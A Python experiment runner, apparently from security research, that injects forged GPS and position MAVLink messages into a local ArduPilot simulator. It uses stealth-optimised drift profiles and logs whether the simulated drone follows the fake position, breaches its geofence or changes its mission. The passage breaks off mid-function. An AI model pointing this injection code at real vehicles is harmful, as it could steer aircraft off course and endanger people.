"""B-path SITL experiment runner.

This runner is intentionally scoped to an authorized local ArduPilot SITL
testbed. It does not perform remote intrusion, credential bypass, RF spoofing,
or attacks against real vehicles.
"""

from __future__ import annotations

import argparse
import csv
from dataclasses import dataclass, replace
from datetime import datetime, timezone
import hashlib
import json
import math
import os
from pathlib import Path
import shutil
import socket
import statistics
import subprocess
import sys
import time
from typing import Iterable

import pymavlink.mavutil as mavutil

from attack_agent import gps_week_time, offset_latlon_m
from bpath.mission_decisions import (
    OBJECTIVES,
    detect_event,
    event_to_row,
    matrix_row,
)
from bpath.planner import attack_plan, choose_objective
from bpath.routes import route_claim, route_label, selected_routes
from bpath.stealth import stealth_score
from utils import haversine_m


PROJECT_ROOT = Path(__file__).resolve().parents[1]
DEFAULT_ARDUPILOT_DIR = Path("/home/user/ai-folder/ardupilot")
DEFAULT_HOME = "37.5665,126.9780,20,0"
NOT_CLAIMED = [
    "remote exploit",
    "credential bypass",
    "RF GNSS spoofing",
    "RF jamming",
    "MAVLink signing bypass",
    "real vehicle takeover",
    "full mission takeover",
]
PARAM_NAMES = [
    "GPS1_TYPE",
    "GPS_TYPE",
    "SIM_GPS1_ENABLE",
    "FENCE_ENABLE",
    "FENCE_TYPE",
    "FENCE_ACTION",
    "FENCE_RADIUS",
    "FENCE_MARGIN",
    "ARMING_CHECK",
    "MIS_RESTART",
    "WPNAV_SPEED",
    "WP_SPD",
]
REQUIRED_BUNDLE_FILES = [
    "README.md",
    "env.json",
    "params_before.txt",
    "params_after.txt",
    "injection.csv",
    "telemetry.csv",
    "sitl.log",
    "verdict.json",
]
INJECTION_FIELDS = [
    "timestamp",
    "experiment",
    "phase",
    "sample_index",
    "target_lat",
    "target_lon",
    "target_alt",
    "north_m",
    "east_m",
    "target_drift_m",
    "vn",
    "ve",
    "vd",
    "commanded_speed_mps",
    "commanded_accel_mps2",
    "profile",
    "engine",
    "route",
]
TELEMETRY_FIELDS = [
    "timestamp",
    "elapsed_s",
    "experiment",
    "phase",
    "sample_index",
    "target_lat",
    "target_lon",
    "target_alt",
    "target_drift_m",
    "obs_lat",
    "obs_lon",
    "obs_alt",
    "official_drift_m",
    "target_error_m",
    "reflected",
    "gps_fix_type",
    "gps_satellites",
    "gps_raw_lat",
    "gps_raw_lon",
    "gps_raw_alt",
    "vn",
    "ve",
    "vd",
    "commanded_speed_mps",
    "commanded_accel_mps2",
    "message_type",
    "status_text",
    "mode",
    "mission_seq",
    "fence_breach_status",
    "fence_breach_count",
    "fence_breach_type",
]
CONTROLLER_FIELDS = [
    "timestamp",
    "experiment",
    "case",
    "iteration",
    "action",
    "target_drift_m",
    "step_m",
    "target_error_m",
    "official_drift_m",
    "reflection_ok",
    "breach_observed",
    "low_bound_m",
    "high_bound_m",
    "commanded_speed_mps",
    "commanded_accel_mps2",
]
DECISION_EVENT_FIELDS = [
    "timestamp",
    "experiment",
    "case",
    "event_type",
    "elapsed_s",
    "sample_index",
    "target_drift_m",
    "official_drift_m",
    "mode",
    "mission_seq",
    "fence_breach_status",
    "status_text",
    "evidence_message_type",
]
ROUTE_MATRIX_FIELDS = [
    "timestamp",
    "route",
    "message",
    "connection",
    "verdict",
    "reason",
    "observed_count",
    "reflection_rate",
    "final_target_drift_m",
    "final_official_drift_m",
    "mean_target_error_m",
    "bundle",
]
MISSION_MATRIX_FIELDS = [
    "objective",
    "case",
    "verdict",
    "reason",
    "decision_changed",
    "event_type",
    "decision_time_s",
    "drift_at_decision_m",
    "minimum_drift_m",
    "reflection_rate",
    "stealth_score",
    "route",
    "profile",
    "bundle",
]
STEALTH_METRICS_FIELDS = [
    "objective",
    "profile",
    "route",
    "decision_changed",
    "stealth_budget",
    "stealth_score",
    "constraint_violations",
    "final_target_drift_m",
    "final_official_drift_m",
    "mean_target_error_m",
    "commanded_speed_max_mps",
    "commanded_accel_max_mps2",
    "abrupt_jump_count",
    "gps_fix_stability",
    "verdict",
    "reason",
    "bundle",
]
PLANNER_TRACE_FIELDS = [
    "objective",
    "available",
    "expected_impact",
    "expected_cost",
    "score",
    "reason",
    "selected",
]
ROUTE_SCORE_FIELDS = [
    "route",
    "objective",
    "profile",
    "verdict",
    "reason",
    "decision_changed",
    "reflection_rate",
    "final_target_drift_m",
    "final_official_drift_m",
    "stealth_score",
    "bundle",
]
IMPACT_MATRIX_FIELDS = [
    "objective",
    "best_route",
    "best_profile",
    "verdict",
    "decision_changed",
    "decision_time_s",
    "minimum_drift_m",
    "stealth_score",
    "source_bundle",
]
PAYLOAD_MATRIX_FIELDS = [
    "timestamp",
    "experiment",
    "payload",
    "route",
    "variant",
    "verdict",
    "reason",
    "effect",
    "preconditions",
    "mission_impact",
    "fc_impact",
    "gcs_or_log_impact",
    "observed_signal",
    "bundle",
]
MISSION_IMPACT_MATRIX_FIELDS = [
    "payload",
    "route",
    "variant",
    "impact_type",
    "impact_confirmed",
    "decision_signal",
    "mode",
    "mission_seq",
    "parameter",
    "before",
    "after",
    "notes",
]
PRECONDITION_MATRIX_FIELDS = [
    "payload",
    "route",
    "required_access",
    "required_state",
    "required_params",
    "blocked_reason",
    "not_claimed",
]


@dataclass
class RunnerConfig:
    ardupilot_dir: Path
    out_root: Path
    home: str = DEFAULT_HOME
    port: int = 5760
    udp_port: int = 14550
    iterations: int = 20
    interval: float = 0.5
    step_m: float = 1.0
    bearing_deg: float = 45.0
    warmup_sec: float = 10.0
    gps_id: int = 0
    fix_type: int = 3
    satellites: int = 12
    hacc: float = 0.8
    vacc: float = 1.2
    sacc: float = 0.25
    max_speed: float = 2.5
    max_accel: float = 1.0
    max_drift_m: float = 30.0
    decision_hold_sec: float = 2.0
    adaptive_refine_steps: int = 5
    profile: str = "linear"
    mission: str = "geofence"
    route: str = "fc-direct"
    objective: str = "auto"
    routes: str = "all"
    stealth_budget: str = "normal"
    payload: str = "all"
    install_mavproxy: bool = False
    build_if_missing: bool = True


@dataclass
class InjectionSample:
    sample_index: int
    target_lat: float
    target_lon: float
    target_alt: float
    north_m: float
    east_m: float
    target_drift_m: float
    vn: float
    ve: float
    vd: float
    commanded_speed_mps: float
    commanded_accel_mps2: float
    profile: str
    engine: str
    route: str


class ManagedProcess:
    def __init__(self, proc: subprocess.Popen, name: str):
        self.proc = proc
        self.name = name

    def stop(self) -> None:
        if self.proc.poll() is not None:
            return
        self.proc.terminate()
        try:
            self.proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            self.proc.kill()
            self.proc.wait(timeout=5)


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def bundle_stamp() -> str:
    return datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S_%fZ")


def parse_home(home: str) -> tuple[float, float, float, float]:
    parts = [float(p.strip()) for p in home.split(",")]
    if len(parts) != 4:
        raise ValueError("home must be lat,lon,alt,heading")
    return parts[0], parts[1], parts[2], parts[3]


def run_text(cmd: list[str], cwd: Path | None = None, timeout: float = 10) -> str:
    try:
        out = subprocess.run(
            cmd,
            cwd=str(cwd) if cwd else None,
            check=False,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout,
        )
    except (OSError, subprocess.TimeoutExpired) as exc:
        return f"<error: {exc}>"
    return out.stdout.strip()


def file_sha256(path: Path) -> str | None:
    if not path.exists():
        return None
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def repo_state() -> dict:
    repo = PROJECT_ROOT.parents[1]
    return {
        "repo_root": str(repo),
        "commit": run_text(["git", "rev-parse", "HEAD"], cwd=repo),
        "status_short": run_text(["git", "status", "--short"], cwd=repo),
    }


def ardupilot_info(ardupilot_dir: Path) -> dict:
    binary = ardupilot_dir / "build" / "sitl" / "bin" / "arducopter"
    info = {
        "dir": str(ardupilot_dir),
        "commit": run_text(["git", "rev-parse", "HEAD"], cwd=ardupilot_dir)
        if (ardupilot_dir / ".git").exists()
        else "<not a git checkout>",
        "binary": str(binary),
        "binary_exists": binary.exists(),
        "binary_executable": os.access(binary, os.X_OK),
        "binary_sha256": file_sha256(binary),
        "binary_mtime_utc": None,
        "binary_size": None,
    }
    if binary.exists():
        st = binary.stat()
        info["binary_mtime_utc"] = datetime.fromtimestamp(
            st.st_mtime, timezone.utc
        ).isoformat()
        info["binary_size"] = st.st_size
    return info


def ensure_sitl_binary(config: RunnerConfig) -> Path:
    binary = config.ardupilot_dir / "build" / "sitl" / "bin" / "arducopter"
    if binary.exists() and os.access(binary, os.X_OK):
        return binary
    if not config.build_if_missing:
        raise FileNotFoundError(f"SITL binary not found: {binary}")
    prepare = PROJECT_ROOT / "scripts" / "prepare_ardupilot_sitl.sh"
    env = os.environ.copy()
    env["ARDUPILOT_DIR"] = str(config.ardupilot_dir)
    subprocess.run([str(prepare)], cwd=str(PROJECT_ROOT), check=True, env=env)
    if not binary.exists() or not os.access(binary, os.X_OK):
        raise FileNotFoundError(f"SITL build did not produce: {binary}")
    return binary


def listening_ports() -> str:
    return run_text(["bash", "-lc", "ss -lntup 2>/dev/null || netstat -lntup 2>/dev/null || true"])


def wait_tcp_port(port: int, timeout: float = 45.0) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        sock = socket.socket()
        sock.settimeout(0.2)
        try:
            sock.connect(("127.0.0.1", port))
        except OSError:
            time.sleep(0.25)
        else:
            sock.close()
            return
        finally:
            sock.close()
    raise TimeoutError(f"TCP {port} did not open")


def write_defaults(path: Path) -> None:
    path.write_text("GPS1_TYPE 14\nGPS_TYPE 14\n", encoding="utf-8")


def start_sitl(config: RunnerConfig, bundle_dir: Path, append_log: bool = False) -> tuple[ManagedProcess, list[str]]:
    binary = ensure_sitl_binary(config)
    defaults = bundle_dir / "sitl_defaults.parm"
    write_defaults(defaults)
    command = [
        str(binary),
        "--model",
        "quad",
        f"--home={config.home}",
        "--defaults",
        str(defaults),
    ]
    mode = "ab" if append_log else "wb"
    with (bundle_dir / "sitl.log").open(mode) as marker:
        marker.write(f"\n===== SITL start {utc_now()} =====\n".encode("utf-8"))
        marker.write((" ".join(command) + "\n").encode("utf-8"))
    log_f = (bundle_dir / "sitl.log").open("ab")
    proc = subprocess.Popen(
        command,
        cwd=str(PROJECT_ROOT),
        stdout=log_f,
        stderr=subprocess.STDOUT,
    )
    log_f.close()
    wait_tcp_port(config.port)
    return ManagedProcess(proc, "arducopter"), command


def find_mavproxy(project_root: Path) -> Path | None:
    candidates = [
        shutil.which("mavproxy.py"),
        str(project_root / ".venv" / "bin" / "mavproxy.py"),
    ]
    for candidate in candidates:
        if candidate and Path(candidate).exists():
            return Path(candidate)
    return None


def install_mavproxy(project_root: Path) -> Path | None:
    python = project_root / ".venv" / "bin" / "python"
    if not python.exists():
        return None
    subprocess.run(
        [str(python), "-m", "pip", "install", "-q", "MAVProxy", "future"],
        cwd=str(project_root),
        check=False,
    )
    return find_mavproxy(project_root)


def start_mavproxy(
    config: RunnerConfig, bundle_dir: Path
) -> tuple[ManagedProcess | None, list[str] | None, str | None]:
    mavproxy = find_mavproxy(PROJECT_ROOT)
    if mavproxy is None and config.install_mavproxy:
        mavproxy = install_mavproxy(PROJECT_ROOT)
    if mavproxy is None:
        return None, None, "mavproxy.py not found"
    command = [
        str(mavproxy),
        f"--master=tcp:127.0.0.1:{config.port}",
        f"--out=udp:127.0.0.1:{config.udp_port}",
        "--daemon",
        "--non-interactive",
    ]
    with (bundle_dir / "sitl.log").open("ab") as marker:
        marker.write(f"\n===== MAVProxy start {utc_now()} =====\n".encode("utf-8"))
        marker.write((" ".join(command) + "\n").encode("utf-8"))
    log_f = (bundle_dir / "sitl.log").open("ab")
    proc = subprocess.Popen(
        command,
        cwd=str(PROJECT_ROOT),
        stdout=log_f,
        stderr=subprocess.STDOUT,
    )
    log_f.close()
    time.sleep(3.0)
    if proc.poll() is not None:
        return None, command, f"MAVProxy exited with code {proc.returncode}"
    return ManagedProcess(proc, "mavproxy"), command, None


def connect_mavlink(connection: str, timeout: float = 45.0):
    conn = mavutil.mavlink_connection(connection, source_system=250)
    conn.wait_heartbeat(timeout=timeout)
    return conn


def request_message_intervals(conn, hz: float = 5.0) -> None:
    msg_ids = [
        getattr(mavutil.mavlink, "MAVLINK_MSG_ID_GLOBAL_POSITION_INT", 33),
        getattr(mavutil.mavlink, "MAVLINK_MSG_ID_GPS_RAW_INT", 24),
        getattr(mavutil.mavlink, "MAVLINK_MSG_ID_STATUSTEXT", 253),
        getattr(mavutil.mavlink, "MAVLINK_MSG_ID_FENCE_STATUS", 162),
        getattr(mavutil.mavlink, "MAVLINK_MSG_ID_MISSION_CURRENT", 42),
        getattr(mavutil.mavlink, "MAVLINK_MSG_ID_HEARTBEAT", 0),
    ]
    cmd = getattr(mavutil.mavlink, "MAV_CMD_SET_MESSAGE_INTERVAL", 511)
    for msg_id in msg_ids:
        try:
            conn.mav.command_long_send(
                conn.target_system,
                conn.target_component,
                cmd,
                0,
                msg_id,
                int(1_000_000 / max(hz, 0.1)),
                0,
                0,
                0,
                0,
                0,
            )
        except Exception:
            pass
    try:
        conn.mav.request_data_stream_send(
            conn.target_system,
            conn.target_component,
            getattr(mavutil.mavlink, "MAV_DATA_STREAM_ALL", 0),
            int(max(hz, 1)),
            1,
        )
    except Exception:
        pass


def param_id(msg) -> str:
    pid = getattr(msg, "param_id", "")
    if isinstance(pid, bytes):
        pid = pid.decode("ascii", "ignore")
    return str(pid).strip("\x00")


def request_param(conn, name: str, timeout: float = 2.0) -> float | None:
    try:
        conn.mav.param_request_read_send(
            conn.target_system, conn.target_component, name.encode("ascii"), -1
        )
    except Exception:
        return None
    deadline = time.time() + timeout
    while time.time() < deadline:
        msg = conn.recv_match(type="PARAM_VALUE", blocking=True, timeout=0.2)
        if msg is None:
            continue
        if param_id(msg) == name:
            return float(msg.param_value)
    return None


def set_param(conn, name: str, value: float, timeout: float = 2.0) -> bool:
    param_type = getattr(mavutil.mavlink, "MAV_PARAM_TYPE_REAL32", 9)
    try:
        conn.mav.param_set_send(
            conn.target_system,
            conn.target_component,
            name.encode("ascii"),
            float(value),
            param_type,
        )
    except Exception:
        return False
    deadline = time.time() + timeout
    while time.time() < deadline:
        msg = conn.recv_match(type="PARAM_VALUE", blocking=True, timeout=0.2)
        if msg is None:
            continue
        if param_id(msg) == name:
            return abs(float(msg.param_value) - float(value)) < 0.1
    return False


def snapshot_params(conn, path: Path, extra: Iterable[str] = ()) -> dict[str, float | None]:
    names = list(dict.fromkeys([*PARAM_NAMES, *extra]))
    values: dict[str, float | None] = {}
    lines = [f"# parameter snapshot: {utc_now()}"]
    for name in names:
        value = request_param(conn, name)
        values[name] = value
        lines.append(f"{name}={value if value is not None else '<no response>'}")
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return values


def send_gps_input(conn, sample: InjectionSample, config: RunnerConfig) -> None:
    week, week_ms = gps_week_time()
    conn.mav.gps_input_send(
        int(time.time() * 1_000_000),
        config.gps_id,
        0,
        week_ms,
        week,
        config.fix_type,
        int(sample.target_lat * 1e7),
        int(sample.target_lon * 1e7),
        float(sample.target_alt),
        0.8,
        1.2,
        float(sample.vn),
        float(sample.ve),
        float(sample.vd),
        float(config.sacc),
        float(config.hacc),
        float(config.vacc),
        int(config.satellites),
    )


def send_global_position_int(conn, sample: InjectionSample) -> None:
    heading = math.degrees(math.atan2(sample.ve, sample.vn)) % 360.0
    conn.mav.global_position_int_send(
        int(time.monotonic() * 1000) % (2**32),
        int(sample.target_lat * 1e7),
        int(sample.target_lon * 1e7),
        int(sample.target_alt * 1000),
        int(sample.target_alt * 1000),
        int(sample.vn * 100),
        int(sample.ve * 100),
        int(sample.vd * 100),
        int(heading * 100),
    )


def send_hil_gps(conn, sample: InjectionSample, config: RunnerConfig) -> None:
    speed = math.sqrt(sample.vn * sample.vn + sample.ve * sample.ve + sample.vd * sample.vd)
    cog = math.degrees(math.atan2(sample.ve, sample.vn)) % 360.0
    conn.mav.hil_gps_send(
        int(time.time() * 1_000_000),
        int(config.fix_type),
        int(sample.target_lat * 1e7),
        int(sample.target_lon * 1e7),
        int(sample.target_alt * 1000),
        int(config.hacc * 100),
        int(config.vacc * 100),
        int(speed * 100),
        int(sample.vn * 100),
        int(sample.ve * 100),
        int(sample.vd * 100),
        int(cog * 100),
        int(config.satellites),
    )


def send_injection(conn, sample: InjectionSample, config: RunnerConfig, injection_kind: str) -> None:
    if injection_kind == "global-position-int":
        send_global_position_int(conn, sample)
    elif injection_kind == "hil-gps":
        send_hil_gps(conn, sample, config)
    else:
        send_gps_input(conn, sample, config)


def generate_sequence(
    base_lat: float,
    base_lon: float,
    base_alt: float,
    config: RunnerConfig,
    profile: str,
    engine: str,
    route: str,
    iterations: int | None = None,
) -> list[InjectionSample]:
    n = int(iterations if iterations is not None else config.iterations)
    if n <= 0:
        return []
    interval = max(config.interval, 1e-3)
    final_drift = n * config.step_m
    bearing = math.radians(config.bearing_deg)
    unit_n = math.cos(bearing)
    unit_e = math.sin(bearing)
    prev_north = 0.0
    prev_east = 0.0
    prev_drift = 0.0
    prev_speed = 0.0
    prev_vn = 0.0
    prev_ve = 0.0
    samples: list[InjectionSample] = []

    for idx in range(1, n + 1):
        r = idx / n
        if profile == "ekf-smooth":
            progress = 3 * r * r - 2 * r * r * r
            drift = final_drift * progress
        elif profile == "stealth-opt":
            progress = 3 * r * r - 2 * r * r * r
            desired = min(config.max_drift_m, final_drift) * progress
            desired_delta = desired - prev_drift
            desired_speed = max(-config.max_speed, min(config.max_speed, desired_delta / interval))
            max_delta_speed = config.max_accel * interval
            if desired_speed > prev_speed:
                speed_1d = min(desired_speed, prev_speed + max_delta_speed)
            else:
                speed_1d = max(desired_speed, prev_speed - max_delta_speed)
            drift = prev_drift + speed_1d * interval
            prev_drift = drift
            prev_speed = speed_1d
        else:
            drift = final_drift * r
        north = drift * unit_n
        east = drift * unit_e
        vn = (north - prev_north) / interval
        ve = (east - prev_east) / interval
        accel = math.sqrt((vn - prev_vn) ** 2 + (ve - prev_ve) ** 2) / interval
        speed = math.sqrt(vn * vn + ve * ve)
        lat, lon = offset_latlon_m(base_lat, base_lon, north, east)
        samples.append(
            InjectionSample(
                sample_index=idx,
                target_lat=lat,
                target_lon=lon,
                target_alt=base_alt,
                north_m=north,
                east_m=east,
                target_drift_m=haversine_m(base_lat, base_lon, lat, lon),
                vn=vn,
                ve=ve,
                vd=0.0,
                commanded_speed_mps=speed,
                commanded_accel_mps2=accel,
                profile=profile,
                engine=engine,
                route=route,
            )
        )
        prev_north = north
        prev_east = east
        prev_vn = vn
        prev_ve = ve
    return samples


def injection_row(experiment: str, phase: str, sample: InjectionSample) -> dict:
    return {
        "timestamp": utc_now(),
        "experiment": experiment,
        "phase": phase,
        "sample_index": sample.sample_index,
        "target_lat": sample.target_lat,
        "target_lon": sample.target_lon,
        "target_alt": sample.target_alt,
        "north_m": sample.north_m,
        "east_m": sample.east_m,
        "target_drift_m": sample.target_drift_m,
        "vn": sample.vn,
        "ve": sample.ve,
        "vd": sample.vd,
        "commanded_speed_mps": sample.commanded_speed_mps,
        "commanded_accel_mps2": sample.commanded_accel_mps2,
        "profile": sample.profile,
        "engine": sample.engine,
        "route": sample.route,
    }


def empty_state() -> dict:
    return {
        "gps_fix_type": "",
        "gps_satellites": "",
        "gps_raw_lat": "",
        "gps_raw_lon": "",
        "gps_raw_alt": "",
        "status_text": "",
        "mode": "",
        "mission_seq": "",
        "fence_breach_status": "",
        "fence_breach_count": "",
        "fence_breach_type": "",
    }


def decode_status_text(msg) -> str:
    text = getattr(msg, "text", "")
    if isinstance(text, bytes):
        return text.decode("utf-8", "ignore").strip("\x00")
    return str(text).strip("\x00")


def collect_telemetry(
    conn,
    experiment: str,
    phase: str,
    sample_index: int,
    target: InjectionSample | None,
    base_lat: float,
    base_lon: float,
    start_time: float,
    duration: float,
    state: dict,
) -> list[dict]:
    rows: list[dict] = []
    deadline = time.time() + duration
    msg_types = [
        "GLOBAL_POSITION_INT",
        "GPS_RAW_INT",
        "STATUSTEXT",
        "HEARTBEAT",
        "FENCE_STATUS",
        "MISSION_CURRENT",
    ]
    while time.time() < deadline:
        msg = conn.recv_match(type=msg_types, blocking=True, timeout=0.05)
        if msg is None:
            continue
        mtype = msg.get_type()
        if mtype == "GPS_RAW_INT":
            state["gps_fix_type"] = getattr(msg, "fix_type", "")
            state["gps_satellites"] = getattr(msg, "satellites_visible", "")
            state["gps_raw_lat"] = getattr(msg, "lat", 0) / 1e7
            state["gps_raw_lon"] = getattr(msg, "lon", 0) / 1e7
            state["gps_raw_alt"] = getattr(msg, "alt", 0) / 1000.0
        elif mtype == "STATUSTEXT":
            state["status_text"] = decode_status_text(msg)
        elif mtype == "HEARTBEAT":
            try:
                state["mode"] = mavutil.mode_string_v10(msg)
            except Exception:
                state["mode"] = ""
        elif mtype == "FENCE_STATUS":
            state["fence_breach_status"] = getattr(msg, "breach_status", "")
            state["fence_breach_count"] = getattr(msg, "breach_count", "")
            state["fence_breach_type"] = getattr(msg, "breach_type", "")
        elif mtype == "MISSION_CURRENT":
            state["mission_seq"] = getattr(msg, "seq", "")

        target_lat = target.target_lat if target else ""
        target_lon = target.target_lon if target else ""
        target_alt = target.target_alt if target else ""
        target_drift = target.target_drift_m if target else ""
        speed = target.commanded_speed_mps if target else ""
        accel = target.commanded_accel_mps2 if target else ""
        obs_lat = obs_lon = obs_alt = ""
        official_drift = target_error = ""
        reflected = ""
        vn = ve = vd = ""

        if mtype == "GLOBAL_POSITION_INT":
            obs_lat = msg.lat / 1e7
            obs_lon = msg.lon / 1e7
            obs_alt = msg.alt / 1000.0
            official_drift = haversine_m(base_lat, base_lon, obs_lat, obs_lon)
            vn = getattr(msg, "vx", 0) / 100.0
            ve = getattr(msg, "vy", 0) / 100.0
            vd = getattr(msg, "vz", 0) / 100.0
            if target is not None:
                target_error = haversine_m(target.target_lat, target.target_lon, obs_lat, obs_lon)
                min_drift = max(0.5, target.target_drift_m * 0.4)
                max_error = max(2.0, target.target_drift_m * 0.75)
                reflected = int(official_drift >= min_drift and target_error <= max_error)

        rows.append(
            {
                "timestamp": utc_now(),
                "elapsed_s": time.time() - start_time,
                "experiment": experiment,
                "phase": phase,
                "sample_index": sample_index,
                "target_lat": target_lat,
                "target_lon": target_lon,
                "target_alt": target_alt,
                "target_drift_m": target_drift,
                "obs_lat": obs_lat,
                "obs_lon": obs_lon,
                "obs_alt": obs_alt,
                "official_drift_m": official_drift,
                "target_error_m": target_error,
                "reflected": reflected,
                "gps_fix_type": state["gps_fix_type"],
                "gps_satellites": state["gps_satellites"],
                "gps_raw_lat": state["gps_raw_lat"],
                "gps_raw_lon": state["gps_raw_lon"],
                "gps_raw_alt": state["gps_raw_alt"],
                "vn": vn,
                "ve": ve,
                "vd": vd,
                "commanded_speed_mps": speed,
                "commanded_accel_mps2": accel,
                "message_type": mtype,
                "status_text": state["status_text"],
                "mode": state["mode"],
                "mission_seq": state["mission_seq"],
                "fence_breach_status": state["fence_breach_status"],
                "fence_breach_count": state["fence_breach_count"],
                "fence_breach_type": state["fence_breach_type"],
            }
        )
    return rows


def baseline_sample(base_lat: float, base_lon: float, base_alt: float, route: str) -> InjectionSample:
    return InjectionSample(
        sample_index=0,
        target_lat=base_lat,
        target_lon=base_lon,
        target_alt=base_alt,
        north_m=0.0,
        east_m=0.0,
        target_drift_m=0.0,
        vn=0.0,
        ve=0.0,
        vd=0.0,
        commanded_speed_mps=0.0,
        commanded_accel_mps2=0.0,
        profile="baseline",
        engine="gps-input",
        route=route,
    )


def warmup_gps(
    conn,
    config: RunnerConfig,
    experiment: str,
    phase: str,
    base_lat: float,
    base_lon: float,
    base_alt: float,
    route: str,
    start_time: float,
    state: dict,
) -> list[dict]:
    sample = baseline_sample(base_lat, base_lon, base_alt, route)
    rows: list[dict] = []
    count = max(1, int(config.warmup_sec / max(config.interval, 0.1)))
    wait = min(config.interval, 0.25)
    for _ in range(count):
        send_gps_input(conn, sample, config)
        rows.extend(
            collect_telemetry(
                conn,
                experiment,
                phase,
                0,
                sample,
                base_lat,
                base_lon,
                start_time,
                wait,
                state,
            )
        )
    return rows


def write_csv(path: Path, fields: list[str], rows: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=fields, extrasaction="ignore")
        writer.writeheader()
        for row in rows:
            writer.writerow(row)


def as_float(value, default: float = 0.0) -> float:
    if value == "" or value is None:
        return default
    try:
        return float(value)
    except (TypeError, ValueError):
        return default


def is_fence_breach_row(row: dict) -> bool:
    breach_status = row.get("fence_breach_status")
    if breach_status not in ("", None) and as_float(breach_status) != 0.0:
        return True
    status = str(row.get("status_text", "")).lower()
    return "fence" in status and "breach" in status


def compute_reflection_metrics(telemetry_rows: list[dict], injection_rows: list[dict]) -> dict:
    observed = [
        row
        for row in telemetry_rows
        if row.get("message_type") == "GLOBAL_POSITION_INT"
        and row.get("target_drift_m") not in ("", None)
        and as_float(row.get("target_drift_m")) > 0.0
        and "warmup" not in str(row.get("phase", ""))
    ]
    reflected = [row for row in observed if str(row.get("reflected")) == "1"]
    target_drifts = [as_float(row.get("target_drift_m")) for row in observed]
    target_errors = [as_float(row.get("target_error_m")) for row in observed]
    official_drifts = [as_float(row.get("official_drift_m")) for row in observed]
    speeds = [as_float(row.get("commanded_speed_mps")) for row in injection_rows]
    accels = [as_float(row.get("commanded_accel_mps2")) for row in injection_rows]
    gps_fix_rows = [
        row
        for row in telemetry_rows
        if row.get("message_type") in ("GPS_RAW_INT", "GLOBAL_POSITION_INT")
        and row.get("gps_fix_type") not in ("", None)
    ]
    stable_fix = [
        row for row in gps_fix_rows if as_float(row.get("gps_fix_type")) >= 3
    ]
    fence_rows = [row for row in telemetry_rows if is_fence_breach_row(row)]
    abrupt_threshold = 2.5
    abrupt_jump_count = sum(1 for accel in accels if accel > abrupt_threshold)

    metrics = {
        "observed_count": len(observed),
        "reflected_count": len(reflected),
        "reflection_rate": len(reflected) / len(observed) if observed else 0.0,
        "final_target_drift_m": target_drifts[-1] if target_drifts else 0.0,
        "final_official_drift_m": official_drifts[-1] if official_drifts else 0.0,
        "mean_target_drift_m": statistics.mean(target_drifts) if target_drifts else 0.0,
        "mean_target_error_m": statistics.mean(target_errors) if target_errors else 0.0,
        "max_target_error_m": max(target_errors) if target_errors else 0.0,
        "commanded_speed_min_mps": min(speeds) if speeds else 0.0,
        "commanded_speed_max_mps": max(speeds) if speeds else 0.0,
        "commanded_accel_min_mps2": min(accels) if accels else 0.0,
        "commanded_accel_max_mps2": max(accels) if accels else 0.0,
        "abrupt_jump_count": abrupt_jump_count,
        "gps_fix_stability": len(stable_fix) / len(gps_fix_rows) if gps_fix_rows else 0.0,
        "gps_raw_available": any(row.get("message_type") == "GPS_RAW_INT" for row in telemetry_rows),
        "global_position_available": bool(observed),
        "fence_breach_observed": bool(fence_rows),
        "fence_breach_count": len(fence_rows),
    }
    return metrics


def positive_reflection_pass(metrics: dict) -> tuple[bool, str]:
    observed_ok = metrics["observed_count"] >= 10
    reflection_ok = metrics["reflection_rate"] >= 0.70
    final_drift_ok = (
        metrics["final_official_drift_m"] >= 0.60 * metrics["final_target_drift_m"]
    )
    error_ok = metrics["mean_target_error_m"] <= max(
        2.0, 0.50 * metrics["mean_target_drift_m"]
    )
    passed = observed_ok and reflection_ok and final_drift_ok and error_ok
    if passed:
        return True, "reflection thresholds passed"
    failed = []
    if not observed_ok:
        failed.append("observed_count < 10")
    if not reflection_ok:
        failed.append("reflection_rate < 0.70")
    if not final_drift_ok:
        failed.append("final official drift below 60 percent of target")
    if not error_ok:
        failed.append("mean target error too high")
    return False, "; ".join(failed)


def negative_control_pass(metrics: dict) -> tuple[bool, str]:
    if metrics["observed_count"] < 5:
        return False, "not enough official telemetry for negative control"
    no_reflection = metrics["reflection_rate"] <= 0.20
    no_final_follow = (
        metrics["final_official_drift_m"] < 0.30 * metrics["final_target_drift_m"]
    )
    if no_reflection and no_final_follow:
        return True, "official position did not follow injected target"
    return False, "negative control unexpectedly reflected or followed injected target"


def compare_smooth(linear: dict, smooth: dict) -> tuple[bool, str]:
    if linear["observed_count"] < 10 or smooth["observed_count"] < 10:
        return False, "not enough telemetry in one or both profiles"
    reflective_enough = smooth["reflection_rate"] >= max(0.70, linear["reflection_rate"] - 0.10)
    improved_error = smooth["mean_target_error_m"] < linear["mean_target_error_m"]
    improved_abrupt = smooth["abrupt_jump_count"] < linear["abrupt_jump_count"]
    improved_accel = smooth["commanded_accel_max_mps2"] < linear["commanded_accel_max_mps2"]
    improved_speed = smooth["commanded_speed_max_mps"] <= linear["commanded_speed_max_mps"] * 1.1
    if reflective_enough and (improved_error or improved_abrupt or improved_accel or improved_speed):
        return True, "smooth profile preserved reflection and improved at least one kinematic metric"
    return False, "smooth profile did not preserve reflection or did not improve measured credibility"


def validate_result_bundle(bundle_dir: Path) -> list[str]:
    return [name for name in REQUIRED_BUNDLE_FILES if not (bundle_dir / name).exists()]


def create_bundle(config: RunnerConfig, experiment: str) -> Path:
    path = config.out_root / f"{bundle_stamp()}_{experiment}"
    path.mkdir(parents=True, exist_ok=False)
    return path


def write_readme(bundle_dir: Path, experiment: str, verdict: dict, env: dict) -> None:
    text = [
        f"# {experiment}",
        "",
        f"- created_at: {env.get('created_at_utc')}",
        f"- route: {env.get('route')}",
        f"- connection: {env.get('connection')}",
        f"- verdict: {verdict.get('verdict')}",
        f"- reason: {verdict.get('reason')}",
        "",
        "Scope: authorized local ArduPilot SITL only. This bundle does not claim remote access, signing bypass, RF spoofing, RF jamming, or real vehicle compromise.",
        "",
        "Required evidence files are in this directory.",
    ]
